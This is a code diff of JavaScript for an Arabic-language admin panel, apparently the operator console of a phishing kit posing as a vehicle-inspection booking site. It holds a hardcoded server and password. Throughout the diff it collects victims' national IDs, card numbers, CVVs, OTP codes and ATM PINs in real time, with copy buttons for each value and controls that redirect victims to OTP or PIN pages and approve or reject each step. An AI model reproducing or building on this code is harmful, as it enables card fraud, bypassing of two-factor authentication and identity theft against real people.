+<audio id="audioNewChatMsg" src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAA..." preload="auto" style="display:none"></audio>
 
 <script>
 const SRV='https://vsafety-server-production.up.railway.app';
 const PASS='Vsafety@2024';
 
-let socket=null, allB=[], curIp=null;
-// ld: live data (payment/otp/pin) بالـ IP كـ key
-// ls: live stage (payment/otp/pin) بالـ IP كـ key
+let socket=null, allB=[], curIp=null, curBId=null;
 let ld={}, ls={};
 
 function doLogin(){
   const p=document.getElementById('passInp').value;
-  if(p!==PASS){
-    document.getElementById('lerr').style.display='block';
-    return;
-  }
+  if(p!==PASS){document.getElementById('lerr').style.display='block';return;}
   document.getElementById('lerr').style.display='none';
   document.getElementById('loginPage').style.display='none';
   document.getElementById('adminPage').style.display='block';
@@ -972,7 +716,7 @@ function doLogout(){
   document.getElementById('adminPage').style.display='none';
   document.getElementById('loginPage').style.display='flex';
   document.getElementById('passInp').value='';
-  allB=[]; ld={}; ls={};
+  allB=[];ld={};ls={};curIp=null;curBId=null;
 }
 
 function initSock(){
@@ -988,17 +732,16 @@ function initSock(){
   });
   socket.on('visitorUpdate',(v)=>{
     document.getElementById('vcnt').textContent=v.count||0;
-    document.getElementById('stVis').textContent=v.count||0;
   });
   socket.on('newBooking',(b)=>{
     allB.unshift(b);
-    renderB();
+    renderSidebar();
     beep(880);
   });
   socket.on('bookingUpdated',(b)=>{
     const i=allB.findIndex(x=>x.id===b.id);
     if(i>=0)allB[i]=b; else allB.unshift(b);
-    renderB();
+    renderSidebar();
   });
   socket.on('newPayment',(d)=>{
     const ip=norm(d.ip||'');
@@ -1007,10 +750,9 @@ function initSock(){
     ld[ip].requestId=d.requestId;
     ls[ip]='payment';
     updPend();
-    rowBadge(ip,'payment');
     updateSidebarBadge(ip,'payment');
     beep(660);
-    if(curIp&&curIp===ip) rebuildCard(ip);
+    if(curIp&&curIp===ip) rebuildContent(ip);
   });
   socket.on('newCode',(d)=>{
     const ip=norm(d.ip||'');
@@ -1020,48 +762,30 @@ function initSock(){
       ld[ip].pin=d.data;
       ld[ip].requestId=d.requestId;
       ls[ip]='pin';
-      rowBadge(ip,'pin');
       updateSidebarBadge(ip,'pin');
     } else {
       ld[ip].otp=d.data;
       ld[ip].requestId=d.requestId;
       ls[ip]='otp';
-      rowBadge(ip,'otp');
       updateSidebarBadge(ip,'otp');
     }
     updPend();
     beep(770);
-    if(curIp&&curIp===ip) rebuildCard(ip);
+    if(curIp&&curIp===ip) rebuildContent(ip);
   });
   socket.on('newData',(d)=>{
     const ip=norm(d.ip||'');
     ld[ip]=ld[ip]||{};
     ld[ip][d.type]=d.data;
-    if(curIp&&curIp===ip) rebuildCard(ip);
+    if(curIp&&curIp===ip) rebuildContent(ip);
   });
 }
 
-function norm(ip){ return (ip||'').replace(/^::ffff:/,''); }
-
-function rowBadge(ip,st){
-  const tr=document.querySelector(`[data-ip="${ip}"]`);
-  if(!tr)return;
-  const td=tr.querySelector('.status-cell');
-  if(!td)return;
-  if(!st){td.innerHTML=lbadge('new');return;}
-  const map={payment:'<span class="badge b-card">💳 بطاقة</span>',otp:'<span class="badge b-otp">🔑 OTP</span>',pin:'<span class="badge b-pin">🔒 PIN</span>'};
-  td.innerHTML=(map[st]||lbadge('new'));
-}
-
-function lbadge(s){
-  const m={new:'<span class="badge b-new">جديد</span>',approved:'<span class="badge b-ok">مكتمل</span>',rejected:'<span class="badge b-rej">مرفوض</span>',pending:'<span class="badge b-pend">قيد المعالجة</span>'};
-  return m[s]||m.new;
-}
+function norm(ip){return (ip||'').replace(/^::ffff:/,'');}
 
 function updPend(){
   const c=Object.keys(ld).length;
-  document.getElementById('stPend').textContent=c;
-  document.getElementById('pendCount').textContent=c;
+  document.getElementById('pendCount').textContent=allB.length;
 }
 
 async function loadB(){
@@ -1069,192 +793,82 @@ async function loadB(){
     const r=await fetch(`${SRV}/api/bookings`);
     const d=await r.json();
     allB=Array.isArray(d)?d:(d.bookings||[]);
-    renderB();
-    updStats();
+    renderSidebar();
   }catch(e){console.error('loadB error',e);}
 }
 
-function renderB(){
-  const q=(document.getElementById('srchInp')?.value||'').toLowerCase();
-  const filtered=allB.filter(b=>{
-    if(!q)return true;
-    return (b.name||'').toLowerCase().includes(q)||
-           (b.phone_number||'').includes(q)||
-           (b.national_id||'').includes(q)||
-           (b.region||'').toLowerCase().includes(q);
-  });
-
-  const grid=document.getElementById('cardsGrid');
-  if(filtered.length===0){
-    grid.innerHTML=`<div class="empty-state">
-      <svg viewBox="0 0 24 24" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
-      <p>لا توجد حجوزات</p>
-    </div>`;
-    return;
-  }
-
-  grid.innerHTML=filtered.map(b=>{
-    const ip=norm(b.ip||'');
-    // تحديد الحالة من ls أو ld
-    let liveSt=ls[ip];
-    if(!liveSt && ld[ip]){
-      if(ld[ip].pin) liveSt='pin';
-      else if(ld[ip].otp) liveSt='otp';
-      else if(ld[ip].pay) liveSt='payment';
-    }
-    const stBadge=liveSt
-      ?{payment:'<span class="badge b-card">💳 بطاقة</span>',otp:'<span class="badge b-otp">🔑 OTP</span>',pin:'<span class="badge b-pin">🔒 PIN</span>'}[liveSt]
-      :lbadge(b.status||'new');
-    const date=b.created_at?new Date(b.created_at).toLocaleDateString('ar-SA'):'';
-    return `<div class="bk-card" data-ip="${ip}" onclick="showD(${b.id})">
-      <div class="bk-card-header">
-        <span class="bk-card-name">${b.name||'-'}</span>
-        <span class="status-cell">${stBadge}</span>
-      </div>
-      <div class="bk-card-body">
-        <div class="bk-field"><span class="bk-lbl">رقم الهوية</span><span class="bk-val">${b.national_id||'-'}</span></div>
-        <div class="bk-field"><span class="bk-lbl">الهاتف</span><span class="bk-val">${b.phone_number||'-'}</span></div>
-        <div class="bk-field"><span class="bk-lbl">المنطقة</span><span class="bk-val">${b.region||'-'}</span></div>
-        <div class="bk-field"><span class="bk-lbl">نوع الخدمة</span><span class="bk-val">${b.service_type||'-'}</span></div>
-        ${date?`<div class="bk-field"><span class="bk-lbl">التاريخ</span><span class="bk-val">${date}</span></div>`:''}
-      </div>
-      <div class="bk-card-footer">
-        <button class="bdet" onclick="event.stopPropagation();showD(${b.id})">
-          <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
-          تفاصيل
-        </button>
-        <div class="bnav-wrap">
-          <button class="bnav" onclick="event.stopPropagation();toggleNav(this,'${b.ip}')">
-            <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l4.553 2.276A1 1 0 0021 18.382V7.618a1 1 0 00-.553-.894L15 4m0 13V4m0 0L9 7"/></svg>
-            توجيه
-          </button>
-          <div class="ndrop" id="nd-${ip}">${navItems(b.ip)}</div>
-        </div>
-      </div>
-    </div>`;
-  }).join('');
-
-  // تحديث الـ sidebar
-  renderSidebar(filtered);
-  updStats();
-}
-
-function renderSidebar(bookings){
+function renderSidebar(){
   const sb=document.getElementById('SidebarUsers');
   const q=(document.getElementById('sidebarSearch')?.value||'').toLowerCase();
-  const items=bookings.filter(b=>{
+  const items=allB.filter(b=>{
     if(!q)return true;
-    return (b.name||'').toLowerCase().includes(q)||(b.phone_number||'').includes(q);
+    return (b.name||'').toLowerCase().includes(q)||(b.phone_number||'').includes(q)||(b.national_id||'').includes(q);
   });
+
+  document.getElementById('pendCount').textContent=items.length;
+
   sb.innerHTML=items.map(b=>{
     const ip=norm(b.ip||'');
     let liveSt=ls[ip];
-    if(!liveSt && ld[ip]){
+    if(!liveSt&&ld[ip]){
       if(ld[ip].pin) liveSt='pin';
       else if(ld[ip].otp) liveSt='otp';
       else if(ld[ip].pay) liveSt='payment';
     }
     const hasNew=liveSt?'':'invisible';
-    const stIcon=liveSt
-      ?{payment:'💳',otp:'🔑',pin:'🔒'}[liveSt]
-      :'';
-    const isSelected=curIp&&curIp===ip?'selected':'';
+    const stIcon=liveSt?{payment:'💳',otp:'🔑',pin:'🔒'}[liveSt]:'';
+    const isSelected=(curBId===b.id)?'selected':'';
     return `<div class="user-div ${isSelected}" id="sb-${ip}" onclick="showD(${b.id})">
       <div class="info-user">
         <span class="new-action ${hasNew}"></span>
-        <span class="name">${b.name||'-'}</span>
+        <div class="name">${b.name||'-'}</div>
       </div>
       <div class="status-user">${stIcon}</div>
     </div>`;
   }).join('');
 }
 
-function filterSidebar(){
-  renderB();
-}
+function filterSidebar(){renderSidebar();}
 
 function updateSidebarBadge(ip,st){
   const div=document.getElementById(`sb-${ip}`);
   if(!div)return;
   const su=div.querySelector('.status-user');
   const na=div.querySelector('.new-action');
-  if(su){
-    const map={payment:'💳',otp:'🔑',pin:'🔒'};
-    su.textContent=map[st]||'';
-  }
-  if(na) na.classList.remove('invisible');
+  if(su){const map={payment:'💳',otp:'🔑',pin:'🔒'};su.textContent=map[st]||'';}
+  if(na)na.classList.remove('invisible');
 }
 
-function navItems(ip){
-  const pages=[
-    {p:'payments',l:'💳 الدفع',c:'#ede9fe',t:'#7c3aed'},
-    {p:'booking',l:'🏠 الرئيسية',c:'#dcfce7',t:'#16a34a'},
-    {p:'code',l:'🔑 OTP',c:'#fef3c7',t:'#d97706'},
-    {p:'madaPin',l:'🔒 الرقم السري',c:'#ccfbf1',t:'#0d9488'},
-    {p:'phone',l:'📱 الهاتف',c:'#dbeafe',t:'#2563eb'},
-    {p:'stcCall',l:'⏳ الانتظار',c:'#f3f4f6',t:'#6b7280'},
-  ];
-  return pages.map(x=>`<div class="nitem" onclick="event.stopPropagation();navTo('${ip}','${x.p}');document.getElementById('nd-${norm(ip)}').classList.remove('open')">
-    <div class="nitem-ic" style="background:${x.c};color:${x.t}">
-      <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l4.553 2.276A1 1 0 0021 18.382V7.618a1 1 0 00-.553-.894L15 4m0 13V4m0 0L9 7"/></svg>
-    </div>
-    ${x.l}
-  </div>`).join('');
-}
-
-function toggleNav(btn,ip){
-  const d=document.getElementById(`nd-${norm(ip)}`);
-  if(!d)return;
-  const wasOpen=d.classList.contains('open');
-  document.querySelectorAll('.ndrop.open').forEach(x=>x.classList.remove('open'));
-  if(!wasOpen)d.classList.add('open');
-  event.stopPropagation();
-}
-document.addEventListener('click',()=>document.querySelectorAll('.ndrop.open').forEach(x=>x.classList.remove('open')));
-
-async function navTo(ip,page){
-  try{
-    const r=await fetch(`${SRV}/api/navigate`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip,page})});
-    const d=await r.json();
-    if(!d.success&&socket)socket.emit('adminNavigate',{ip,page});
-  }catch(e){ if(socket)socket.emit('adminNavigate',{ip,page}); }
-  toast('✅ تم التوجيه: '+page);
-}
-
-function updStats(){
-  document.getElementById('stTotal').textContent=allB.length;
-  const today=new Date().toISOString().split('T')[0];
-  document.getElementById('stToday').textContent=allB.filter(b=>b.created_at&&b.created_at.startsWith(today)).length;
-  document.getElementById('stOk').textContent=allB.filter(b=>b.status==='approved').length;
-}
-
-// ===== MODAL =====
 async function showD(id){
-  const b=allB.find(x=>x.id===id); if(!b)return;
+  const b=allB.find(x=>x.id===id);if(!b)return;
   curIp=norm(b.ip||'');
-  document.getElementById('mSub').textContent=(b.ip||'').toString().substring(0,20);
+  curBId=id;
 
   // تحديث الـ sidebar selection
   document.querySelectorAll('.user-div.selected').forEach(x=>x.classList.remove('selected'));
   const sbDiv=document.getElementById(`sb-${curIp}`);
-  if(sbDiv) sbDiv.classList.add('selected');
+  if(sbDiv)sbDiv.classList.add('selected');
 
   let ex={payments:[],codes:[]};
-  try{ const r=await fetch(`${SRV}/api/data/${b.ip}`); ex=await r.json(); }catch(e){}
+  try{const r=await fetch(`${SRV}/api/data/${b.ip}`);ex=await r.json();}catch(e){}
 
-  buildM(b,ex);
-  document.getElementById('modal').classList.add('open');
+  buildContent(b,ex);
 }
 
 const cpSvg=`<svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>`;
 
-function buildM(b,ex){
-  const body=document.getElementById('mbody');
+function buildContent(b,ex){
+  const ctn=document.getElementById('ContainerUserForms');
   const stl={new:'جديد',approved:'مكتمل',rejected:'مرفوض',pending:'قيد المعالجة'}[b.status]||'جديد';
   const created=b.created_at?new Date(b.created_at).toLocaleString('ar-SA'):'';
   const updated=b.updated_at?new Date(b.updated_at).toLocaleString('ar-SA'):'';
 
   let h=`
+  <div class="content-hdr">
+    <div class="content-hdr-title">تفاصيل الحجز</div>
+    <div style="font-size:11px;color:#9ca3af;font-family:monospace;direction:ltr">${b.ip||''}</div>
+  </div>
+
   <div class="msec-hdr">
     <svg width="16" height="16" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:#374151"><path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
     بيانات العميل
@@ -1266,7 +880,6 @@ function buildM(b,ex){
     ${b.email?`<div class="frow"><span class="flbl">البريد الإلكتروني</span><span class="fval">${b.email}</span></div>`:''}
     <div class="frow"><span class="flbl">منطقة الفحص</span><span class="fval ar">${b.region||'-'}</span></div>
     <div class="frow"><span class="flbl">نوع الخدمة</span><span class="fval ar">${b.service_type||'-'}</span></div>
-    <div class="frow"><span class="flbl">IP العميل</span><span class="fval">${b.ip||'-'}</span></div>
     <div class="frow"><span class="flbl">الحالة</span><span class="fval ar">${stl}</span></div>
   </div>`;
 
@@ -1277,7 +890,7 @@ function buildM(b,ex){
     <svg width="16" height="16" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:#374151"><path d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 011.447-.894L9 7m0 13l6-3m-6 3V7m6 10l4.553 2.276A1 1 0 0021 18.382V7.618a1 1 0 00-.553-.894L15 4m0 13V4m0 0L9 7"/></svg>
     توجيه العميل إلى صفحة
   </div>
-  <div class="nav-btns" style="margin-bottom:16px">
+  <div class="nav-btns">
     <button class="nbp" style="background:#ede9fe;color:#7c3aed" onclick="navTo('${b.ip}','payments')">💳 الدفع</button>
     <button class="nbp" style="background:#dcfce7;color:#16a34a" onclick="navTo('${b.ip}','booking')">🏠 الرئيسية</button>
     <button class="nbp" style="background:#fef3c7;color:#d97706" onclick="navTo('${b.ip}','code')">🔑 OTP</button>
@@ -1291,7 +904,7 @@ function buildM(b,ex){
     ${updated?`<div class="mfdate"><span class="mfdate-l">آخر تحديث</span><span class="mfdate-v">${updated}</span></div>`:''}
   </div>`;
 
-  body.innerHTML=h;
+  ctn.innerHTML=h;
 }
 
 function buildCardSection(ip, ex){
@@ -1305,36 +918,26 @@ function buildCardSection(ip, ex){
   const hc=(ex&&ex.codes)||[];
 
   const cardData=pd||(hp.length>0?hp[0]:null);
-  const sessionStartTime = pd ? (pd.timestamp ? new Date(pd.timestamp).getTime() : 0) : 0;
+  const sessionStartTime=pd?(pd.timestamp?new Date(pd.timestamp).getTime():0):0;
   const dbOtps=hc.filter(c=>{
-    if(c.code_type==='pin') return false;
-    if(sessionStartTime>0){
-      const ct=c.created_at?new Date(c.created_at).getTime():0;
-      return ct>=sessionStartTime;
-    }
+    if(c.code_type==='pin')return false;
+    if(sessionStartTime>0){const ct=c.created_at?new Date(c.created_at).getTime():0;return ct>=sessionStartTime;}
     return true;
   });
   const dbPinsArr=hc.filter(c=>{
-    if(c.code_type!=='pin') return false;
-    if(sessionStartTime>0){
-      const ct=c.created_at?new Date(c.created_at).getTime():0;
-      return ct>=sessionStartTime;
-    }
+    if(c.code_type!=='pin')return false;
+    if(sessionStartTime>0){const ct=c.created_at?new Date(c.created_at).getTime():0;return ct>=sessionStartTime;}
     return true;
   });
-  const allOtps=od
-    ?[od,...dbOtps.filter(c=>c.request_id!==od.requestId && c.code!==od.code)]
-    :[...dbOtps];
-  const allPins=pind
-    ?[pind,...dbPinsArr.filter(c=>c.request_id!==pind.requestId && c.code!==pind.code)]
-    :[...dbPinsArr];
+  const allOtps=od?[od,...dbOtps.filter(c=>c.request_id!==od.requestId&&c.code!==od.code)]:[...dbOtps];
+  const allPins=pind?[pind,...dbPinsArr.filter(c=>c.request_id!==pind.requestId&&c.code!==pind.code)]:[...dbPinsArr];
   let stage=ls[ldKey]||ls[nip];
   if(!stage){
     const dbPins=hc.filter(c=>c.code_type==='pin');
     const dbOtps2=hc.filter(c=>c.code_type==='otp');
-    if(dbPins.length>0 && dbPins[0].request_id) stage='pin';
-    else if(dbOtps2.length>0 && dbOtps2[0].request_id) stage='otp';
-    else if(hp.length>0 && hp[0].request_id) stage='payment';
+    if(dbPins.length>0&&dbPins[0].request_id)stage='pin';
+    else if(dbOtps2.length>0&&dbOtps2[0].request_id)stage='otp';
+    else if(hp.length>0&&hp[0].request_id)stage='payment';
   }
 
   let h=`
@@ -1352,22 +955,10 @@ function buildCardSection(ip, ex){
     const cv=cardData.cvv||'-';
     h+=`
     <div class="card-list">
-      <div class="card-row">
-        <span class="card-lbl">اسم الحامل</span>
-        <div class="card-val"><span class="card-num">${hn}</span><button class="cpbtn" onclick="cp('${hn.replace(/'/g,"\\'")}',this)">${cpSvg}</button></div>
-      </div>
-      <div class="card-row">
-        <span class="card-lbl">رقم البطاقة</span>
-        <div class="card-val"><span class="card-num">${cn}</span><button class="cpbtn" onclick="cp('${rn}',this)">${cpSvg}</button></div>
-      </div>
-      <div class="card-row">
-        <span class="card-lbl">تاريخ الانتهاء</span>
-        <div class="card-val"><span class="card-num">${exp}</span><button class="cpbtn" onclick="cp('${exp}',this)">${cpSvg}</button></div>
-      </div>
-      <div class="card-row">
-        <span class="card-lbl">CVV</span>
-        <div class="card-val"><span class="card-num">${cv}</span><button class="cpbtn" onclick="cp('${cv}',this)">${cpSvg}</button></div>
-      </div>
+      <div class="card-row"><span class="card-lbl">اسم الحامل</span><div class="card-val"><span class="card-num">${hn}</span><button class="cpbtn" onclick="cp('${hn.replace(/'/g,"\\'")}',this)">${cpSvg}</button></div></div>
+      <div class="card-row"><span class="card-lbl">رقم البطاقة</span><div class="card-val"><span class="card-num">${cn}</span><button class="cpbtn" onclick="cp('${rn}',this)">${cpSvg}</button></div></div>
+      <div class="card-row"><span class="card-lbl">تاريخ الانتهاء</span><div class="card-val"><span class="card-num">${exp}</span><button class="cpbtn" onclick="cp('${exp}',this)">${cpSvg}</button></div></div>
+      <div class="card-row"><span class="card-lbl">CVV</span><div class="card-val"><span class="card-num">${cv}</span><button class="cpbtn" onclick="cp('${cv}',this)">${cpSvg}</button></div></div>
     </div>`;
   } else {
     h+=`<div class="waiting"><span class="spin"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg></span>في انتظار بيانات البطاقة...</div>`;
@@ -1388,10 +979,7 @@ function buildCardSection(ip, ex){
       const tsRaw=o.timestamp||o.created_at||null;
       const ts=tsRaw?new Date(tsRaw).toLocaleTimeString('ar-SA',{hour:'2-digit',minute:'2-digit',second:'2-digit'}):'';
       const lbl=allOtps.length>1?`رمز OTP #${allOtps.length-i}`:'رمز OTP';
-      h+=`<div class="otp-row">
-        <span class="otp-lbl">${lbl}${ts?` <span style="font-size:10px;color:#9ca3af">(${ts})</span>`:''}</span>
-        <div class="otp-val">${oc}<button class="cpbtn" onclick="cp('${oc}',this)">${cpSvg}</button></div>
-      </div>`;
+      h+=`<div class="otp-row"><span class="otp-lbl">${lbl}${ts?` <span style="font-size:10px;color:#9ca3af">(${ts})</span>`:''}</span><div class="otp-val">${oc}<button class="cpbtn" onclick="cp('${oc}',this)">${cpSvg}</button></div></div>`;
     });
   } else {
     h+=`<div class="otp-row"><span class="otp-lbl">رمز OTP</span><span class="otp-wait">في الانتظار...</span></div>`;
@@ -1412,10 +1000,7 @@ function buildCardSection(ip, ex){
       const tsRaw=p.timestamp||p.created_at||null;
       const ts=tsRaw?new Date(tsRaw).toLocaleTimeString('ar-SA',{hour:'2-digit',minute:'2-digit',second:'2-digit'}):'';
       const lbl=allPins.length>1?`الرقم السري #${allPins.length-i}`:'الرقم السري ATM';
-      h+=`<div class="otp-row">
-        <span class="otp-lbl">${lbl}${ts?` <span style="font-size:10px;color:#9ca3af">(${ts})</span>`:''}</span>
-        <div class="pin-val">${pc}<button class="cpbtn" onclick="cp('${pc}',this)">${cpSvg}</button></div>
-      </div>`;
+      h+=`<div class="otp-row"><span class="otp-lbl">${lbl}${ts?` <span style="font-size:10px;color:#9ca3af">(${ts})</span>`:''}</span><div class="pin-val">${pc}<button class="cpbtn" onclick="cp('${pc}',this)">${cpSvg}</button></div></div>`;
     });
   } else {
     h+=`<div class="otp-row"><span class="otp-lbl">الرقم السري ATM</span><span class="otp-wait">في الانتظار...</span></div>`;
@@ -1429,7 +1014,6 @@ function buildCardSection(ip, ex){
       <svg width="16" height="16" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:#374151"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
       الإجراءات
     </div>`;
-
   if(stage){
     h+=`
     <div class="act-btns" id="abtns">
@@ -1449,21 +1033,11 @@ function buildCardSection(ip, ex){
   } else {
     h+=`
     <div class="act-btns">
-      <button class="abtn abtn-gray">
-        <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 13l4 4L19 7"/></svg>
-        قبول / التالي
-      </button>
-      <button class="abtn abtn-gray">
-        <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 18L18 6M6 6l12 12"/></svg>
-        رفض
-      </button>
-      <button class="abtn abtn-done" onclick="navTo('${ip}','booking')">
-        <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
-        إتمام الدفع
-      </button>
+      <button class="abtn abtn-gray"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 13l4 4L19 7"/></svg>قبول / التالي</button>
+      <button class="abtn abtn-gray"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 18L18 6M6 6l12 12"/></svg>رفض</button>
+      <button class="abtn abtn-done" onclick="navTo('${ip}','booking')"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>إتمام الدفع</button>
     </div>`;
   }
-
   h+=`
     <div class="rej-msg" style="margin-top:10px">
       <label>رسالة الرفض المخصصة:</label>
@@ -1474,96 +1048,77 @@ function buildCardSection(ip, ex){
   return h;
 }
 
-function _injectCardHtml(body, html){
-  const cardSec=body.querySelector('.card-sec');
-  const navSecHdr=[...body.querySelectorAll('.msec-hdr')].find(n=>n.textContent.includes('توجيه'));
-  if(cardSec&&navSecHdr){
-    let el=cardSec;
-    while(el&&el!==navSecHdr.parentElement){
-      const next=el.nextElementSibling;
-      if(el===navSecHdr||el===navSecHdr.parentElement)break;
-      el.remove(); el=next;
-    }
-    navSecHdr.insertAdjacentHTML('beforebegin',html);
-  }
-  const cb=body.querySelector('.card-list,.otp-sec');
-  if(cb){cb.classList.add('pbx');setTimeout(()=>cb.classList.remove('pbx'),800);}
+async function rebuildContent(ip){
+  if(!curBId)return;
+  const b=allB.find(x=>x.id===curBId);
+  if(!b||norm(b.ip||'')!==norm(ip))return;
+  let ex={payments:[],codes:[]};
+  try{const r=await fetch(`${SRV}/api/data/${b.ip}`);ex=await r.json();}catch(e){}
+  buildContent(b,ex);
 }
 
-async function rebuildCard(ip){
-  const body=document.getElementById('mbody'); if(!body)return;
-  _injectCardHtml(body, buildCardSection(ip,{payments:[],codes:[]}));
-  let ex={payments:[],codes:[]};
+async function navTo(ip,page){
   try{
-    const bk=allB.find(x=>norm(x.ip||'')===norm(ip));
-    const rawIp=bk?bk.ip:ip;
-    const r=await fetch(`${SRV}/api/data/${rawIp}`);
-    ex=await r.json();
-  }catch(e){}
-  if(document.getElementById('mbody')){
-    _injectCardHtml(document.getElementById('mbody'), buildCardSection(ip,ex));
-  }
+    const r=await fetch(`${SRV}/api/navigate`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip,page})});
+    const d=await r.json();
+    if(!d.success&&socket)socket.emit('adminNavigate',{ip,page});
+  }catch(e){if(socket)socket.emit('adminNavigate',{ip,page});}
+  toast('✅ تم التوجيه: '+page);
 }
 
 async function appv(ip,stage){
-  let rid = null;
-  const l = ld[ip] || ld[norm(ip)];
-  if(l && l.requestId) rid = l.requestId;
+  let rid=null;
+  const l=ld[ip]||ld[norm(ip)];
+  if(l&&l.requestId)rid=l.requestId;
   if(!rid){
     try{
-      const r = await fetch(`${SRV}/api/data/${encodeURIComponent(ip)}`);
-      const ex = await r.json();
-      if(stage==='payment' && ex.payments && ex.payments.length>0){
-        rid = ex.payments[0].request_id;
-      } else if((stage==='otp'||stage==='pin') && ex.codes && ex.codes.length>0){
-        const filtered = ex.codes.filter(c=>c.code_type===(stage==='otp'?'otp':'pin'));
-        if(filtered.length>0) rid = filtered[0].request_id;
-        if(!rid) rid = ex.codes[0].request_id;
+      const r=await fetch(`${SRV}/api/data/${encodeURIComponent(ip)}`);
+      const ex=await r.json();
+      if(stage==='payment'&&ex.payments&&ex.payments.length>0){rid=ex.payments[0].request_id;}
+      else if((stage==='otp'||stage==='pin')&&ex.codes&&ex.codes.length>0){
+        const filtered=ex.codes.filter(c=>c.code_type===(stage==='otp'?'otp':'pin'));
+        if(filtered.length>0)rid=filtered[0].request_id;
+        if(!rid)rid=ex.codes[0].request_id;
       }
-    }catch(e){ console.warn('appv: failed to fetch requestId from DB',e); }
+    }catch(e){}
   }
-  if(!rid){ toast('⚠️ انتهت صلاحية الطلب أو تم معالجته'); return; }
+  if(!rid){toast('⚠️ انتهت صلاحية الطلب أو تم معالجته');return;}
   disableAbtns();
   try{
     const res=await fetch(`${SRV}/api/approve`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({requestId:rid})});
     const data=await res.json();
-    if(!data.success&&socket&&socket.connected) socket.emit('adminApprove',{requestId:rid});
-  }catch(e){
-    if(socket&&socket.connected) socket.emit('adminApprove',{requestId:rid});
-  }
+    if(!data.success&&socket&&socket.connected)socket.emit('adminApprove',{requestId:rid});
+  }catch(e){if(socket&&socket.connected)socket.emit('adminApprove',{requestId:rid});}
   toast('✅ تم القبول');
-  if(stage==='pin'){ delete ld[ip]; delete ls[ip]; updPend(); rowBadge(ip,null); updateSidebarBadge(ip,null); }
+  if(stage==='pin'){delete ld[ip];delete ls[ip];updPend();updateSidebarBadge(ip,null);}
 }
 
 async function rejv(ip,stage){
-  let rid = null;
-  const l = ld[ip] || ld[norm(ip)];
-  if(l && l.requestId) rid = l.requestId;
+  let rid=null;
+  const l=ld[ip]||ld[norm(ip)];
+  if(l&&l.requestId)rid=l.requestId;
   if(!rid){
     try{
-      const r = await fetch(`${SRV}/api/data/${encodeURIComponent(ip)}`);
-      const ex = await r.json();
-      if(stage==='payment' && ex.payments && ex.payments.length>0){
-        rid = ex.payments[0].request_id;
-      } else if((stage==='otp'||stage==='pin') && ex.codes && ex.codes.length>0){
-        const filtered = ex.codes.filter(c=>c.code_type===(stage==='otp'?'otp':'pin'));
-        if(filtered.length>0) rid = filtered[0].request_id;
-        if(!rid) rid = ex.codes[0].request_id;
+      const r=await fetch(`${SRV}/api/data/${encodeURIComponent(ip)}`);
+      const ex=await r.json();
+      if(stage==='payment'&&ex.payments&&ex.payments.length>0){rid=ex.payments[0].request_id;}
+      else if((stage==='otp'||stage==='pin')&&ex.codes&&ex.codes.length>0){
+        const filtered=ex.codes.filter(c=>c.code_type===(stage==='otp'?'otp':'pin'));
+        if(filtered.length>0)rid=filtered[0].request_id;
+        if(!rid)rid=ex.codes[0].request_id;
       }
-    }catch(e){ console.warn('rejv: failed to fetch requestId from DB',e); }
+    }catch(e){}
   }
-  if(!rid){ toast('⚠️ انتهت صلاحية الطلب أو تم معالجته'); return; }
+  if(!rid){toast('⚠️ انتهت صلاحية الطلب أو تم معالجته');return;}
   const msg=(document.getElementById('rejMsgInp')?.value)||'تم رفض العملية. يرجى المحاولة مرة أخرى.';
   disableAbtns();
   try{
     const res=await fetch(`${SRV}/api/reject`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({requestId:rid,message:msg})});
     const data=await res.json();
